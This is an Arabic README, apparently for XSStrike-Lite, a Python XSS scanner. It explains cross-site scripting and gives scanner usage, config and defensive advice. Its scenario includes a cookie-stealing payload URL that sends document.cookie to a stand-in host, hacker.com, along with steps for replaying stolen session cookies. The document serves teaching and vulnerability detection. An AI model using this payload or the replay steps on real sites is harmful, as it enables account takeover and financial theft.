## 📖 ما هو XSS؟

**XSS (Cross-Site Scripting)** هي ثغرة أمنية في تطبيقات الويب تسمح للمهاجم بحقن أكواد JavaScript خبيثة في صفحات الويب التي يشاهدها المستخدمون الآخرون. عندما يتم تنفيذ هذا الكود في متصفح الضحية، يمكن للمهاجم:

- سرقة كوكيز الجلسة (Session Cookies).
- إعادة توجيه الضحية لمواقع مزيفة.
- تنفيذ إجراءات نيابة عن المستخدم (مثل تغيير كلمة المرور).
- سرقة البيانات الشخصية.

تُصنّف XSS على أنها واحدة من أخطر 10 ثغرات أمنية في تطبيقات الويب وفقاً لمنظمة **OWASP**.

---

### 🎯 السيناريو الحقيقي:

**1. المهاجم يبني موقعاً مزيفاً** (صفحة تسجيل دخول مزيفة).

**2. المهاجم يصنع رابطاً مشبوهاً:**

```

http://bank.com/login?name=<script>document.location='http://hacker.com/steal.php?c='+document.cookie</script>

```

**3. المهاجم يرسل الرابط للضحية عبر:**

- إيميل تصيّد ("تم إلغاء حسابك، اضغط هنا").
- رسالة SMS.
- منشور على فيسبوك.
- رسالة واتساب.

**4. الضحية (أنت) تضغط الرابط:**

- يفتح المتصفح صفحة البنك الحقيقية.
- لكن الـ URL يحتوي على الكود الخبيث.
- البنك (المصاب) يعرض الكود في HTML.
- المتصفح ينفذ الكود.
- الكود يرسل كوكي جلسة البنك إلى `hacker.com/steal.php`.

**5. المهاجم يستلم الكوكي:**

```

PHPSESSID=abc123
bank_session=xyz789
user_id=12345

```

**6. المهاجم يضع الكوكي في متصفحه:**

- يفتح متصفح جديد.
- يستخدم إضافة مثل "EditThisCookie".
- يضع الكوكي المسروق.
- يفتح موقع البنك.
- **البنك يعتقد أن المهاجم هو الضحية!**
- **المهاجم يدخل حساب البنك بدون كلمة مرور.**
- **يحوّل كل الأموال لحسابه.**

---

### 💀 الخلاصة: هذا هو الهجوم الحقيقي

| العنصر | التأثير |
| :--- | :--- |
| **نافذة تنبيه** | مجرد دليل على نجاح الحقن. |
| **سرقة الكوكي** | انتحال شخصية الضحية. |
| **انتحال الشخصية** | الوصول الكامل للحساب. |
| **الوصول الكامل** | خسائر مالية، بيانات مسروقة. |

**الفرق بين "اكتشاف ثغرة" و"استغلالها":**
- **اكتشاف الثغرة:** ما فعلناه في DVWA.
- **استغلال الثغرة:** ما يفعله المهاجم الحقيقي.

**هدف أداتك:** اكتشاف الثغرات **قبل** أن يستغلها المهاجمون.

## 💡 الحل: XSStrike-Lite

**أداة خفيفة الوزن، مبنية بالكامل بلغة Python النقية** (بدون أي مكتبات خارجية)، تقوم بـ:

1. **الزحف (Crawl):** زيارة الموقع المستهدف واستخراج كل النماذج والمدخلات.
2. **الحقن (Inject):** إرسال حمولات XSS متنوعة إلى كل مدخل.
3. **الكشف (Detect):** فحص ردود الخادم للتحقق من انعكاس الحمولات.
4. **التقرير (Report):** إنشاء تقرير HTML احترافي بالنتائج.

---

## ✨ المميزات

- ✅ **Pure Python:** لا تحتاج أي مكتبات خارجية (فقط `argparse`, `logging`, `urllib`, `re`, `json`).
- ✅ **Cross-Platform:** تعمل على Windows و Linux و macOS.
- ✅ **واجهة سطر أوامر احترافية:** تدعم subcommands (`scan`, `check`).
- ✅ **ملف إعدادات مرن:** يمكن تخصيص الإعدادات عبر `config.json`.
- ✅ **تقارير احترافية:** تقرير HTML بتصميم عصري، مع إحصائيات ودرجات خطورة.
- ✅ **معالجة أخطاء شاملة:** رسائل واضحة لكل نوع خطأ.
- ✅ **سجلات مفصلة:** كل عملية تُسجَّل في ملف `logs/`.

```bash
python xss_scanner.py --help
```


3. فحص موقع كامل:

```bash
python xss_scanner.py scan --url http://example.com/page.php
```

4. فحص موقع مع ملف إعدادات:

```bash
python xss_scanner.py --config config.json scan --url http://example.com/page.php
```

5. فحص مدخل واحد فقط (سريع):

```bash
python xss_scanner.py check --url http://example.com/page.php --param name
```

6. فحص مع طريقة POST:

```bash
python xss_scanner.py check --url http://example.com/login.php --param username --method POST
```

7. تحديد ملف تقرير مختلف:

```bash
python xss_scanner.py scan --url http://example.com --output my_report.html
```

8. تفعيل وضع التصحيح (Debug):

```bash
python xss_scanner.py --log-level DEBUG scan --url http://example.com
```

⚙️ ملف الإعدادات (config.json)

يمكنك تخصيص الإعدادات بدون تعديل الكود. انسخ الملف النموذجي:

```bash
copy config.example.json config.json    # على Windows
cp config.example.json config.json      # على Linux/macOS
```

ثم عدّل config.json:

```json
{
    "cookies": {
        "PHPSESSID": "your_session_id",
        "security": "low"
    },
    "delay": 0.2,
    "timeout": 10,
    "log_level": "INFO"
}
```

الشرح:

· cookies: كوكيز الجلسة (للمواقع التي تتطلب تسجيل دخول).
· delay: التأخير بين الطلبات (بالثواني).
· timeout: مهلة الاتصال (بالثواني).
· log_level: مستوى السجلات.

⚠️ ملاحظة: ملف config.json غير مرفوع على GitHub لحماية الكوكيز.

🛡️ كيف تحمي نفسك من XSS؟ (الجزء الدفاعي)

1. تشفير المخرجات (Output Encoding):

· قبل عرض أي بيانات قادمة من المستخدم، شفّرها:
· < → &lt;
· > → &gt;
· " → &quot;
· ' → &#39;

2. التحقق من المدخلات (Input Validation):

· ارفض أي مدخل يحتوي على <script> أو < أو >.
· استخدم "القائمة البيضاء" (Whitelist).

3. سياسة أمان المحتوى (CSP):

· أضف هيدر Content-Security-Policy.
· مثال: Content-Security-Policy: default-src 'self'

4. استخدام أطر العمل الحديثة:

· React و Angular و Vue.js تحمي من XSS تلقائياً.
· لا تستخدم innerHTML أو eval() في JavaScript.

5. تعقيم HTML (HTML Sanitization):

· استخدم مكتبات مثل DOMPurify.

6. الكوكيز الآمنة:

· استخدم دائماً HttpOnly و Secure و SameSite.
